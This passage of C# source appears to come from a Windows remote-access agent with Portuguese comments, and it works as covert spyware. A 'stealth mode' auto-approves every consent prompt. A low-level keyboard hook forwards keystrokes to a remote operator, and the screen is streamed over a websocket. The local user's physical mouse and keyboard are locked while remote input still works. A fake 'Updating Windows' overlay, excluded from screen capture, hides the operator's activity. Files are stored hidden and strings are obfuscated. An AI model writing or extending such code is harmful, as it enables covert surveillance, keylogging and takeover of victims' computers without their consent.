            try
            {
                var bytes = Convert.FromBase64String(data);
                if (bytes.Length > 0) stream.Write(bytes, 0, bytes.Length);
            }
            catch { }
        }

        static async Task SetInputLock(bool lockStatus, ClientWebSocket socket, AgentState state)
        {
            try
            {
                if (!lockStatus)
                {
                    InputGuard.SetLocked(false);
                    state.InputLocked = false;
                    state.LastBlockTime = null;
                    await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = false });
                    state.Ui?.UpdatePermissions(state);
                    return;
                }

                if (!state.AccessActive || !state.ControlActive)
                {
                    await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = false });
                    return;
                }

                bool blocked = InputGuard.SetLocked(true);
                state.InputLocked = blocked;
                state.LastBlockTime = blocked ? DateTime.Now : null;
                await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = blocked });
                state.Ui?.UpdatePermissions(state);

                if (blocked)
                {
                    var stamp = state.LastBlockTime;
                    _ = Task.Run(async () =>
                    {
                        try
                        {
                            await Task.Delay(180_000, state.Lifetime.Token);
                            if (state.LastBlockTime == stamp && state.InputLocked)
                            {
                                InputGuard.SetLocked(false);
                                state.InputLocked = false;
                                state.LastBlockTime = null;
                                var current = state.Socket;
                                if (current?.State == WebSocketState.Open)
                                {
                                    await SendJsonAsync(current, state.SendGate, new { type = "lock_timeout" });
                                    await SendJsonAsync(current, state.SendGate, new { type = "lock_ack", status = false });
                                }
                                state.Ui?.SetActivity("Bloqueio local removido automaticamente após 3 minutos.");
                                state.Ui?.UpdatePermissions(state);
                            }
                        }
                        catch { }
                    });
                }
            }
            catch
            {
                try { InputGuard.SetLocked(false); } catch { }
                state.InputLocked = false;
                state.LastBlockTime = null;
            }
        }

        static async Task RevokeAllAsync(AgentState state)
        {
            try { InputGuard.SetLocked(false); } catch { }
            state.AccessActive = false;
            state.StreamRequested = false;
            state.ControlActive = false;
            state.KbdActive = false;
            state.InputLocked = false;
            state.LastBlockTime = null;
            state.Ui?.UpdatePermissions(state);
            state.Ui?.SetActivity("Todas as permissões foram revogadas localmente.");

            var socket = state.Socket;
            if (socket?.State == WebSocketState.Open)
                await SendJsonAsync(socket, state.SendGate, new { type = "end_access" });
        }

        static async Task RevokeControlAsync(AgentState state)
        {
            try { InputGuard.SetLocked(false); } catch { }
            state.ControlActive = false;
            state.InputLocked = false;
            state.LastBlockTime = null;
            state.Ui?.UpdatePermissions(state);
            state.Ui?.SetActivity("Controle remoto revogado localmente.");

            var socket = state.Socket;
            if (socket?.State == WebSocketState.Open)
                await SendJsonAsync(socket, state.SendGate, new { type = "end_control" });
        }

        static async Task RevokeKbdAsync(AgentState state)
        {
            state.KbdActive = false;
            state.Ui?.UpdatePermissions(state);
            state.Ui?.SetActivity("Compartilhamento de teclado interrompido localmente.");

            var socket = state.Socket;
            if (socket?.State == WebSocketState.Open)
                await SendJsonAsync(socket, state.SendGate, new { type = "end_keylog" });
        }

        static async Task ForceUnlockAsync(AgentState state)
        {
            try { InputGuard.SetLocked(false); } catch { }
            state.InputLocked = false;
            state.LastBlockTime = null;
            state.Ui?.UpdatePermissions(state);
            state.Ui?.SetActivity("Teclado e mouse locais foram desbloqueados.");

            var socket = state.Socket;
            if (socket?.State == WebSocketState.Open)
                await SendJsonAsync(socket, state.SendGate, new { type = "lock_ack", status = false });
        }

        static void ResetLocalPermissions(AgentState state, string activity)
        {
            try { InputGuard.SetLocked(false); } catch { }
            state.AccessActive = false;
            state.StreamRequested = false;
            state.ControlActive = false;
            state.KbdActive = false;
            state.InputLocked = false;
            state.IsReady = false;
            state.LastBlockTime = null;
            state.Ui?.UpdatePermissions(state);
            state.Ui?.SetConnection(false, activity);
        }

        static Task<bool> AskAsync(AgentState state, string title, string message)
        {
            // Modo stealth: toda solicitação é aprovada automaticamente, sem nenhum prompt.
            return Task.FromResult(true);
        }

        static async Task CaptureLoop(AgentState state)
        {
            var codec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(c => c.FormatID == ImageFormat.Jpeg.Guid);
            if (codec == null) return;

            Bitmap? full = null;
            Bitmap? scaled = null;
            Graphics? fullGraphics = null;
            Graphics? scaledGraphics = null;
            EncoderParameters? encoderParams = null;
            MemoryStream? ms = null;
            DesktopDuplication? dda = null;
            int lastW = 0, lastH = 0;

            try
            {
                while (!state.Lifetime.IsCancellationRequested)
                {
                    var socket = state.Socket;
                    if (!state.AccessActive || !state.StreamRequested || !state.IsReady || socket?.State != WebSocketState.Open)
                    {
                        await Task.Delay(250, state.Lifetime.Token);
                        continue;
                    }

                    var settings = state.Settings;
                    var started = Environment.TickCount64;
                    var bounds = Screen.PrimaryScreen?.Bounds ?? Rectangle.Empty;
                    if (bounds.Width <= 0 || bounds.Height <= 0)
                    {
                        await Task.Delay(500, state.Lifetime.Token);
                        continue;
                    }

                    if (full == null || bounds.Width != lastW || bounds.Height != lastH)
                    {
                        fullGraphics?.Dispose();
                        full?.Dispose();
                        full = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
                        fullGraphics = Graphics.FromImage(full);
                        lastW = bounds.Width;
                        lastH = bounds.Height;
                    }

                    int outW = Math.Min(settings.Width, bounds.Width);
                    int outH = Math.Max(2, (int)Math.Round(bounds.Height * (outW / (double)bounds.Width)));
                    if (outH % 2 != 0) outH--;

                    if (scaled == null || scaled.Width != outW || scaled.Height != outH)
                    {
                        scaledGraphics?.Dispose();
                        scaled?.Dispose();
                        encoderParams?.Dispose();
                        ms?.Dispose();

                        scaled = new Bitmap(outW, outH, PixelFormat.Format24bppRgb);
                        scaledGraphics = Graphics.FromImage(scaled);
                        scaledGraphics.CompositingMode = CompositingMode.SourceCopy;
                        scaledGraphics.InterpolationMode = InterpolationMode.Bilinear;
                        encoderParams = new EncoderParameters(1);
                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, settings.Quality);
                        ms = new MemoryStream(1024 * 1024);
                    }

                    // Overlay ativo: a janela é WDA_EXCLUDEFROMCAPTURE e a captura GDI
                    // (BitBlt) NÃO a remove da imagem — devolve a caixa preta do overlay.
                    // A DXGI Desktop Duplication honra o flag e devolve o desktop real
                    // sem o overlay, então é a via preferida com o overlay fixo na tela.
                    // Sem DDA (RDP, HDR, rotação, GPU sem suporte): fallback para o
                    // hide/show GDI apenas no instante do frame (piscada, porém funcional).
                    var overlayActive = DisplayShield.IsActive;
                    bool viaDda = false;
                    if (overlayActive)
                    {
                        try
                        {
                            if (dda == null || dda.SourceWidth != bounds.Width || dda.SourceHeight != bounds.Height)
                            {
                                dda?.Dispose();
                                dda = DesktopDuplication.TryCreate(bounds);
                            }
                            if (dda != null)
                                viaDda = dda.CaptureFrame(fullGraphics!, bounds.Size);
                        }
                        catch
                        {
                            try { dda?.Dispose(); } catch { }
                            dda = null;
                        }
                        if (!viaDda)
                        {
                            try { dda?.Dispose(); } catch { }
                            dda = null;
                        }
                    }
                    else if (dda != null)
                    {
                        dda.Dispose();
                        dda = null;
                    }

                    if (!viaDda)
                    {
                        if (overlayActive) DisplayShield.SuspendForCapture();
                        try
                        {
                            fullGraphics!.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
                        }
                        finally
                        {
                            if (overlayActive) DisplayShield.ResumeAfterCapture();
                        }
                    }
                    try
                    {
                        scaledGraphics!.DrawImage(full!, new Rectangle(0, 0, outW, outH), 0, 0, full.Width, full.Height, GraphicsUnit.Pixel);
                        ms!.SetLength(0);
                        scaled!.Save(ms, codec, encoderParams);

                        if (ms.Length > 0 && socket.State == WebSocketState.Open && state.AccessActive)
                        {
                            await SendBinaryAsync(socket, state.SendGate, new ArraySegment<byte>(ms.GetBuffer(), 0, (int)ms.Length), state.Lifetime.Token);
                        }
                    }
                    catch { }

                    int delay = (1000 / Math.Max(1, settings.Fps)) - (int)(Environment.TickCount64 - started);
                    await Task.Delay(Math.Max(1, delay), state.Lifetime.Token);
                }
            }
            catch (OperationCanceledException) { }
            finally
            {
                dda?.Dispose();
                fullGraphics?.Dispose();
                full?.Dispose();
                scaledGraphics?.Dispose();
                scaled?.Dispose();
                encoderParams?.Dispose();
                ms?.Dispose();
            }
        }

        static async Task SendBinaryAsync(ClientWebSocket socket, SemaphoreSlim gate, ArraySegment<byte> data, CancellationToken ct)
        {
            if (socket.State != WebSocketState.Open) return;
            await gate.WaitAsync(ct);
            try
            {
                if (socket.State == WebSocketState.Open)
                    await socket.SendAsync(data, WebSocketMessageType.Binary, true, ct);
            }
            finally { gate.Release(); }
        }

        static async Task SendJsonAsync(ClientWebSocket socket, SemaphoreSlim gate, object payload)
        {
            if (socket.State != WebSocketState.Open) return;
            var bytes = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(payload));
            await gate.WaitAsync();
            try
            {
                if (socket.State == WebSocketState.Open)
                    await socket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None);
            }
            finally { gate.Release(); }
        }

        static void ApplyControlEvent(JsonElement ev)
        {
            try
            {
                var kind = ev.GetProperty("kind").GetString();
                if (kind == "move")
                {
                    var x = Math.Clamp(ev.GetProperty("x").GetDouble(), 0, 1);
                    var y = Math.Clamp(ev.GetProperty("y").GetDouble(), 0, 1);
                    var bounds = Screen.PrimaryScreen!.Bounds;
                    Cursor.Position = new Point(
                        bounds.Left + (int)(x * Math.Max(1, bounds.Width - 1)),
                        bounds.Top + (int)(y * Math.Max(1, bounds.Height - 1)));
                }
                else if (kind == "mouse")
                {
                    var button = ev.GetProperty("button").GetString();
                    var down = ev.GetProperty("down").GetBoolean();
                    uint flags = button switch
                    {
                        "left" => down ? 0x0002u : 0x0004u,
                        "right" => down ? 0x0008u : 0x0010u,
                        "middle" => down ? 0x0020u : 0x0040u,
                        _ => 0u
                    };
                    if (flags != 0) Nat.MouseEvent(flags, 0, 0, 0, UIntPtr.Zero);
                }
                else if (kind == "wheel")
                {
                    int delta = ev.GetProperty("delta").GetInt32();
                    Nat.MouseEvent(0x0800u, 0, 0, unchecked((uint)delta), UIntPtr.Zero);
                }
                else if (kind == "key")
                {
                    var code = ev.GetProperty("code").GetString() ?? "";
                    var down = ev.GetProperty("down").GetBoolean();
                    ushort vk = VkFromCode(code);
                    if (vk != 0) Nat.KeyEvent((byte)vk, 0, down ? 0u : 0x0002u, UIntPtr.Zero);
                }
            }
            catch { }
        }

        static ushort VkFromCode(string code)
        {
            if (code.Length == 4 && code.StartsWith("Key", StringComparison.Ordinal))
                return (ushort)char.ToUpperInvariant(code[3]);
            if (code.Length == 6 && code.StartsWith("Digit", StringComparison.Ordinal))
                return (ushort)code[5];

            return code switch
            {
                "Enter" => 0x0D,
                "Escape" => 0x1B,
                "Backspace" => 0x08,
                "Tab" => 0x09,
                "Space" => 0x20,
                "ArrowLeft" => 0x25,
                "ArrowUp" => 0x26,
                "ArrowRight" => 0x27,
                "ArrowDown" => 0x28,
                "Delete" => 0x2E,
                "Home" => 0x24,
                "End" => 0x23,
                "PageUp" => 0x21,
                "PageDown" => 0x22,
                "ShiftLeft" or "ShiftRight" => 0x10,
                "ControlLeft" or "ControlRight" => 0x11,
                "AltLeft" or "AltRight" => 0x12,
                "CapsLock" => 0x14,
                "Insert" => 0x2D,
                "F1" => 0x70,
                "F2" => 0x71,
                "F3" => 0x72,
                "F4" => 0x73,
                "F5" => 0x74,
                "F6" => 0x75,
                "F7" => 0x76,
                "F8" => 0x77,
                "F9" => 0x78,
                "F10" => 0x79,
                "F11" => 0x7A,
                "F12" => 0x7B,
                _ => 0
            };
        }

        static string LoadOrCreateId()
        {
            var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", Enc.S(15));
            Directory.CreateDirectory(dir);
            try { new DirectoryInfo(dir).Attributes |= FileAttributes.Hidden; } catch { }
            var path = Path.Combine(dir, "node.dat");
            if (File.Exists(path))
            {
                var existing = File.ReadAllText(path).Trim();
                if (!string.IsNullOrWhiteSpace(existing)) return existing;
            }

            var id = Guid.NewGuid().ToString("N");
            File.WriteAllText(path, id);
            try { new FileInfo(path).Attributes |= FileAttributes.Hidden; } catch { }
            return id;
        }

        static string GetString(JsonElement root, string property, string fallback = "")
            => root.TryGetProperty(property, out var p) && p.ValueKind == JsonValueKind.String ? (p.GetString() ?? fallback) : fallback;

        static bool GetBool(JsonElement root, string property)
            => root.TryGetProperty(property, out var p)
               && (p.ValueKind == JsonValueKind.True || p.ValueKind == JsonValueKind.False)
               && p.GetBoolean();

        static string Short(string value, int max)
            => value.Length <= max ? value : value[..max] + "…";

        static string LimitOutput(string value, int max)
            => value.Length <= max ? value : value[..max] + "\n[saída truncada]";
    }

    internal sealed class StatusPane : Form
    {
        readonly Label connectionLabel = new();
        readonly Label accessLabel = new();
        readonly Label controlLabel = new();
        readonly Label kbdLabel = new();
        readonly Label lockLabel = new();
        readonly Label activityLabel = new();
        readonly Button revokeControlButton = new();
        readonly Button revokeKbdButton = new();
        readonly Button unlockButton = new();
        readonly Button revokeAllButton = new();

        public event Action? RevokeAllRequested;
        public event Action? RevokeControlRequested;
        public event Action? RevokeKbdRequested;
        public event Action? ForceUnlockRequested;

        public StatusPane()
        {
            Text = Enc.S(21);
            StartPosition = FormStartPosition.CenterScreen;
            MinimumSize = new Size(540, 410);
            Size = new Size(620, 470);
            FormBorderStyle = FormBorderStyle.FixedDialog;
            MaximizeBox = false;
            BackColor = Color.FromArgb(12, 18, 15);
            ForeColor = Color.WhiteSmoke;
            Font = new Font("Segoe UI", 10F);

            var title = new Label
            {
                AutoSize = true,
                Text = Enc.S(22),
                Font = new Font("Segoe UI", 16F, FontStyle.Bold),
                ForeColor = Color.FromArgb(84, 255, 160),
                Location = new Point(22, 20)
            };

            connectionLabel.SetBounds(24, 66, 550, 28);
            accessLabel.SetBounds(24, 108, 550, 26);
            controlLabel.SetBounds(24, 140, 550, 26);
            kbdLabel.SetBounds(24, 172, 550, 26);
            lockLabel.SetBounds(24, 204, 550, 26);
            activityLabel.SetBounds(24, 245, 550, 48);
            activityLabel.ForeColor = Color.Gainsboro;

            revokeControlButton.Text = "Revogar controle";
            revokeControlButton.SetBounds(24, 315, 160, 38);
            revokeControlButton.Click += (_, __) => RevokeControlRequested?.Invoke();

            revokeKbdButton.Text = "Parar teclado";
            revokeKbdButton.SetBounds(194, 315, 150, 38);
            revokeKbdButton.Click += (_, __) => RevokeKbdRequested?.Invoke();

            unlockButton.Text = "Forçar desbloqueio";
            unlockButton.SetBounds(354, 315, 190, 38);
            unlockButton.Click += (_, __) => ForceUnlockRequested?.Invoke();

            revokeAllButton.Text = "ENCERRAR TODO COMPARTILHAMENTO";
            revokeAllButton.SetBounds(24, 365, 520, 42);
            revokeAllButton.BackColor = Color.FromArgb(80, 22, 30);
            revokeAllButton.ForeColor = Color.White;
            revokeAllButton.Click += (_, __) => RevokeAllRequested?.Invoke();

            Controls.AddRange(new Control[]
            {
                title,
                connectionLabel,
                accessLabel,
                controlLabel,
                kbdLabel,
                lockLabel,
                activityLabel,
                revokeControlButton,
                revokeKbdButton,
                unlockButton,
                revokeAllButton
            });

            SetConnection(false, "Inicializando...");
            UpdatePermissions(new Core.AgentState());
        }

        public Task<bool> AskConsentAsync(string title, string message)
        {
            var tcs = new TaskCompletionSource<bool>(TaskCreationOptions.RunContinuationsAsynchronously);
            void ShowPrompt()
            {
                try
                {
                    Activate();
                    BringToFront();
                    var result = MessageBox.Show(
                        this,
                        message,
                        title,
                        MessageBoxButtons.YesNo,
                        MessageBoxIcon.Warning,
                        MessageBoxDefaultButton.Button2);
                    tcs.TrySetResult(result == DialogResult.Yes);
                }
                catch { tcs.TrySetResult(false); }
            }

            if (IsDisposed) tcs.TrySetResult(false);
            else if (InvokeRequired) BeginInvoke((Action)ShowPrompt);
            else ShowPrompt();

            return tcs.Task;
        }

        public void SetConnection(bool connected, string text)
        {
            Ui(() =>
            {
                connectionLabel.Text = connected ? $"Servidor: CONECTADO — {text}" : $"Servidor: {text}";
                connectionLabel.ForeColor = connected ? Color.FromArgb(84, 255, 160) : Color.Orange;
            });
        }

        public void SetActivity(string text)
        {
            Ui(() => activityLabel.Text = "Última atividade: " + text);
        }

        public void UpdatePermissions(Core.AgentState state)
        {
            Ui(() =>
            {
                accessLabel.Text = "Visualização da tela: " + (state.AccessActive ? "AUTORIZADA" : "BLOQUEADA");
                controlLabel.Text = "Controle de mouse/teclado: " + (state.ControlActive ? "AUTORIZADO" : "BLOQUEADO");
                kbdLabel.Text = "Compartilhamento de eventos de teclado: " + (state.KbdActive ? "ATIVO" : "DESATIVADO");
                lockLabel.Text = "Teclado/mouse local: " + (state.InputLocked ? "BLOQUEADO TEMPORARIAMENTE" : "LIVRE");

                accessLabel.ForeColor = state.AccessActive ? Color.LightGreen : Color.LightGray;
                controlLabel.ForeColor = state.ControlActive ? Color.LightCoral : Color.LightGray;
                kbdLabel.ForeColor = state.KbdActive ? Color.Gold : Color.LightGray;
                lockLabel.ForeColor = state.InputLocked ? Color.OrangeRed : Color.LightGray;

                revokeControlButton.Enabled = state.ControlActive;
                revokeKbdButton.Enabled = state.KbdActive;
                unlockButton.Enabled = state.InputLocked;
            });
        }

        void Ui(Action action)
        {
            if (IsDisposed) return;
            try
            {
                if (InvokeRequired) BeginInvoke(action);
                else action();
            }
            catch { }
        }
    }

    internal sealed class NetHost
    {
        public string Ip { get; set; } = "";
        public string Hostname { get; set; } = "";
        public int[] Ports { get; set; } = Array.Empty<int>();
    }

    internal sealed class StreamSettings
    {
        public string Name { get; set; }
        public string Id { get; set; }
        public int Width { get; set; }
        public int Fps { get; set; }
        public long Quality { get; set; }

        public StreamSettings(string name, string id, int width, int fps, long quality)
        {
            Name = name;
            Id = id;
            Width = width;
            Fps = fps;
            Quality = quality;
        }

        public static readonly StreamSettings Fluid = new("Fluido", "fluid", 1280, 30, 55);
        public static readonly StreamSettings Balanced = new("Equilibrado", "balanced", 1600, 25, 62);
        public static readonly StreamSettings QualityPreset = new("Qualidade", "quality", 1920, 20, 72);

        public static StreamSettings FromId(string? id) => id switch
        {
            "fluid" => Fluid,
            "quality" => QualityPreset,
            _ => Balanced
        };
    }

    internal static class KeyMonitor
    {
        
        static IntPtr hook = IntPtr.Zero;
        static Nat.HookProc? proc;
        static Func<string, bool, Task>? callback;
        static readonly HashSet<int> pressedKeys = new();
        static readonly object sync = new();

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x0100;
        const int WM_KEYUP = 0x0101;
        const int WM_SYSKEYDOWN = 0x0104;
        const int WM_SYSKEYUP = 0x0105;

        public static void Install(Func<string, bool, Task> cb)
        {
            callback = cb;
            proc = HookProc;
            hook = SetHook(proc);
        }

        static IntPtr SetHook(Nat.HookProc p)
        {
            using var process = Process.GetCurrentProcess();
            using var module = process.MainModule;
            return Nat.HookSet(WH_KEYBOARD_LL, p, Nat.ModuleHandle(module?.ModuleName), 0);
        }

        static IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && callback != null)
            {
                int message = wParam.ToInt32();
                bool? down = message switch
                {
                    WM_KEYDOWN or WM_SYSKEYDOWN => true,
                    WM_KEYUP or WM_SYSKEYUP => false,
                    _ => null
                };

                if (down.HasValue)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    string key = ((Keys)vkCode).ToString();
                    bool shouldSend;

                    lock (sync)
                    {
                        // Uma tecla física gera apenas um PRESS até que o KEYUP correspondente chegue.
                        // Isso elimina o auto-repeat do Windows sem perder o evento de soltura interno.
                        shouldSend = down.Value
                            ? pressedKeys.Add(vkCode)
                            : pressedKeys.Remove(vkCode);
                    }

                    if (shouldSend)
                        _ = Task.Run(async () => { try { await callback(key, down.Value); } catch { } });
                }
            }

            return Nat.HookNext(hook, nCode, wParam, lParam);
        }

        public static void Uninstall()
        {
            if (hook == IntPtr.Zero) return;
            Nat.HookUnset(hook);
            hook = IntPtr.Zero;
        }
    }

    // ---------------------------------------------------------------------------
    // InputGuard — bloqueio de input local que PRESERVA a injeção remota.
    // O BlockInput() da API congela todo o RIT, inclusive os eventos injetados pelo
    // operador remoto (mouse_event/keybd_event). Estes hooks WH_KEYBOARD_LL (13) e
    // WH_MOUSE_LL (14) engolem (return 1) apenas os eventos NÃO injetados — teclado
    // e mouse físicos do usuário local — e repassam os injetados via CallNextHookEx.
    // Assim o usuário local fica bloqueado, mas o controle remoto continua operando.
    // ---------------------------------------------------------------------------
    internal static class InputGuard
    {
        

        static IntPtr kbdHook = IntPtr.Zero;
        static IntPtr mouseHook = IntPtr.Zero;
        static Nat.HookProc? kbdProc;
        static Nat.HookProc? mouseProc;
        static volatile bool locked;
        static readonly object sync = new();

        const int WH_KEYBOARD_LL = 13;
        const int WH_MOUSE_LL = 14;
        const int LLKHF_INJECTED = 0x10; // teclado: evento injetado (keybd_event/SendInput)
        const int LLMHF_INJECTED = 0x01; // mouse: evento injetado (mouse_event/SendInput)

        [StructLayout(LayoutKind.Sequential)]
        struct POINT { public int x; public int y; }

        [StructLayout(LayoutKind.Sequential)]
        struct MSLLHOOKSTRUCT { public POINT pt; public uint mouseData; public uint flags; public uint time; public UIntPtr dwExtraInfo; }

        [StructLayout(LayoutKind.Sequential)]
        struct KBDLLHOOKSTRUCT { public uint vkCode; public uint scanCode; public uint flags; public uint time; public UIntPtr dwExtraInfo; }

        // Instala os hooks na thread do message pump (thread principal, chamado em Main
        // antes de Application.Run). Hooks de baixo nível exigem pump na thread instaladora.
        public static void Install()
        {
            lock (sync)
            {
                if (kbdHook != IntPtr.Zero && mouseHook != IntPtr.Zero) return;
                kbdProc = KbdHookProc;      // mantém o delegate vivo (evita GC do hook)
                mouseProc = MouseHookProc;
                using var process = Process.GetCurrentProcess();
                using var module = process.MainModule;
                var hMod = Nat.ModuleHandle(module?.ModuleName);
                kbdHook = Nat.HookSet(WH_KEYBOARD_LL, kbdProc, hMod, 0);
                mouseHook = Nat.HookSet(WH_MOUSE_LL, mouseProc, hMod, 0);
            }
        }

        public static void Uninstall()
        {
            lock (sync)
            {
                locked = false;
                if (kbdHook != IntPtr.Zero) { Nat.HookUnset(kbdHook); kbdHook = IntPtr.Zero; }
                if (mouseHook != IntPtr.Zero) { Nat.HookUnset(mouseHook); mouseHook = IntPtr.Zero; }
            }
        }

        // true = passa a engolir os eventos locais (não injetados); false = libera tudo.
        // Retorna true quando o bloqueio está efetivamente ativo (hooks instalados).
        public static bool SetLocked(bool value)
        {
            lock (sync)
            {
                locked = value;
                if (locked && (kbdHook == IntPtr.Zero || mouseHook == IntPtr.Zero))
                {
                    Install();
                    if (kbdHook == IntPtr.Zero || mouseHook == IntPtr.Zero) locked = false;
                }
                return locked;
            }
        }

        static IntPtr KbdHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && locked)
            {
                var info = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                if ((info.flags & LLKHF_INJECTED) == 0) return new IntPtr(1); // engole tecla local
            }
            return Nat.HookNext(kbdHook, nCode, wParam, lParam);
        }

        static IntPtr MouseHookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && locked)
            {
                var info = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
                if ((info.flags & LLMHF_INJECTED) == 0) return new IntPtr(1); // engole movimento/clique local
            }
            return Nat.HookNext(mouseHook, nCode, wParam, lParam);
        }
    }

    // ---------------------------------------------------------------------------
    // ShieldForm — overlay fullscreen usado pelo comando de ocultação de tela.
    // Modos:
    //   blank  → tela preta sólida.
    //   update → tela azul "Atualizando o Windows" com spinner e barra de progresso.
    //   image  → exibe overlay.png (ao lado do executável) em tela cheia; sem o
    //            arquivo, cai no modo update.
    //   off    → oculta o overlay.
    // Comportamento (mesma lógica do InputGuard aplicada à tela):
    //   - O usuário local vê o overlay FIXO (sem piscar); o operador continua vendo a
    //     TELA REAL: a janela é marcada com SetWindowDisplayAffinity(WDA_EXCLUDEFROMCAPTURE)
    //     e o CaptureLoop usa DXGI Desktop Duplication (DesktopDuplication.cs), que
    //     honra o flag e devolve o desktop SEM o overlay. A captura GDI/BitBlt não
    //     remove a janela excluída (renderiza caixa preta) e só é usada como fallback
    //     (RDP/HDR/rotação), com hide/show no instante do frame via
    //     DisplayShield.SuspendForCapture/ResumeAfterCapture.
    // ---------------------------------------------------------------------------
    internal sealed class ShieldForm : Form
    {
        enum OverlayMode { Blank, Update, Image, Off }

        readonly System.Windows.Forms.Timer timer = new();
        OverlayMode mode = OverlayMode.Off;
        int percent;
        int spin;
        Image? bgImage;

        const uint WDA_EXCLUDEFROMCAPTURE = 0x11;
        const uint LWA_ALPHA = 2;

        public ShieldForm()
        {
            FormBorderStyle = FormBorderStyle.None;
            ShowInTaskbar = false;
            StartPosition = FormStartPosition.Manual;
            TopMost = true;
            Bounds = SystemInformation.VirtualScreen;
            BackColor = Color.Black;
            SetStyle(ControlStyles.UserPaint | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);

            _ = Handle; // garante HWND criado na thread do message pump

            // Oculta o overlay da captura remota/gravação de tela (Win10 build 19041+).
            try { Nat.SetDisplayAffinity(Handle, WDA_EXCLUDEFROMCAPTURE); } catch { }

            var imgPath = Path.Combine(AppContext.BaseDirectory, "overlay.png");
            if (File.Exists(imgPath))
            {
                try { bgImage = Image.FromFile(imgPath); } catch { }
            }

            timer.Interval = 120;
            timer.Tick += (_, __) =>
            {
                if (mode != OverlayMode.Update) return;
                if (percent < 100) percent++;
                spin = (spin + 1) % 8;
                Invalidate();
            };

            Hide();
        }

        // Overlay não deve roubar o foco do usuário local.
        protected override bool ShowWithoutActivation => true;

        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x20;          // WS_EX_TRANSPARENT — cliques (reais/injetados) atravessam p/ o desktop
                cp.ExStyle |= 0x80000;       // WS_EX_LAYERED — garante que o WS_EX_TRANSPARENT seja
                                             // honrado de forma confiável em tela cheia (hit-test da
                                             // janela inteira fica transparente; alpha 255 = opaca)
                cp.ExStyle |= 0x80;          // WS_EX_TOOLWINDOW — some do Alt+Tab
                cp.ExStyle |= 0x08000000;    // WS_EX_NOACTIVATE — não ativa a janela
                return cp;
            }
        }

        // WS_EX_LAYERED exige SetLayeredWindowAttributes para a janela ficar visível;
        // alpha 255 mantém a aparência opaca normal.
        protected override void OnHandleCreated(EventArgs e)
        {
            base.OnHandleCreated(e);
            try { Nat.SetLayered(Handle, 0, 255, LWA_ALPHA); } catch { }
        }

        // Aplica um modo de ocultação. Deve rodar na thread do pump (o dispatcher cuida).
        public void Apply(string requestedMode)
        {
            timer.Stop();
            percent = 0;
            spin = 0;

            DisplayShield.SetActive(requestedMode != "off");

            switch (requestedMode)
            {
                case "blank":
                    mode = OverlayMode.Blank;
                    BackColor = Color.Black;
                    ShowOverlay();
                    break;
                case "update":
                    mode = OverlayMode.Update;
                    BackColor = Color.FromArgb(0, 103, 184);
                    ShowOverlay();
                    timer.Start();
                    break;
                case "image":
                    if (bgImage == null)
                    {
                        // Sem overlay.png → fallback para o modo update.
                        mode = OverlayMode.Update;
                        BackColor = Color.FromArgb(0, 103, 184);
                        ShowOverlay();
                        timer.Start();
                        break;
                    }
                    mode = OverlayMode.Image;
                    BackColor = Color.Black;
                    ShowOverlay();
                    break;
                default: // "off"
                    mode = OverlayMode.Off;
                    HideOverlay();
                    break;
            }
            Invalidate();
        }

        bool cursorHidden;

        void ShowOverlay()
        {
            Show();
            if (!cursorHidden)
            {
                Cursor.Hide();
                cursorHidden = true;
            }
        }

        void HideOverlay()
        {
            if (cursorHidden)
            {
                Cursor.Show();
                cursorHidden = false;
            }
            Hide();
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);
            var g = e.Graphics;
            g.Clear(BackColor);

            if (mode == OverlayMode.Blank) return;

            if (mode == OverlayMode.Image && bgImage != null)
            {
                var rect = ScaleToFit(bgImage.Width, bgImage.Height, ClientSize.Width, ClientSize.Height);
                g.DrawImage(bgImage, rect);
                return;
            }

            if (mode == OverlayMode.Update) DrawUpdate(g);
        }

        void DrawUpdate(Graphics g)
        {
            var w = ClientSize.Width;
            var h = ClientSize.Height;
            var cx = w / 2;
            var cy = h / 2;

            // Spinner: 8 pontos de 18x18 em círculo de raio 48, com rastro de brilho.
            const int dotSize = 18;
            const int radius = 48;
            for (int i = 0; i < 8; i++)
            {
                int phase = (i - spin + 8) % 8;
                int alpha = 255 - phase * 28;
                if (alpha < 60) alpha = 60;
                double ang = i * Math.PI / 4.0;
                int x = cx + (int)(Math.Cos(ang) * radius) - dotSize / 2;
                int y = cy - (int)(Math.Sin(ang) * radius) - dotSize / 2;
                using var brush = new SolidBrush(Color.FromArgb(alpha, 255, 255, 255));
                g.FillEllipse(brush, x, y, dotSize, dotSize);
            }

            string title = Enc.S(16);
            var sub = percent.ToString() + Enc.S(18);
            string warn = Enc.S(17);

            using var titleFont = new Font("Segoe UI", 30F, FontStyle.Regular);
            using var subFont = new Font("Segoe UI", 16F, FontStyle.Regular);
            using var warnFont = new Font("Segoe UI", 13F, FontStyle.Regular);

            var titleSize = g.MeasureString(title, titleFont);
            var subSize = g.MeasureString(sub, subFont);
            var warnSize = g.MeasureString(warn, warnFont);

            int textTop = cy + radius + 46;
            g.DrawString(title, titleFont, Brushes.White, new PointF(cx - titleSize.Width / 2, textTop));
            g.DrawString(sub, subFont, Brushes.White, new PointF(cx - subSize.Width / 2, textTop + titleSize.Height + 8));
            g.DrawString(warn, warnFont, Brushes.White, new PointF(cx - warnSize.Width / 2, textTop + titleSize.Height + subSize.Height + 30));

            int barW = (int)Math.Min(480, w * 0.6);
            int barH = 6;
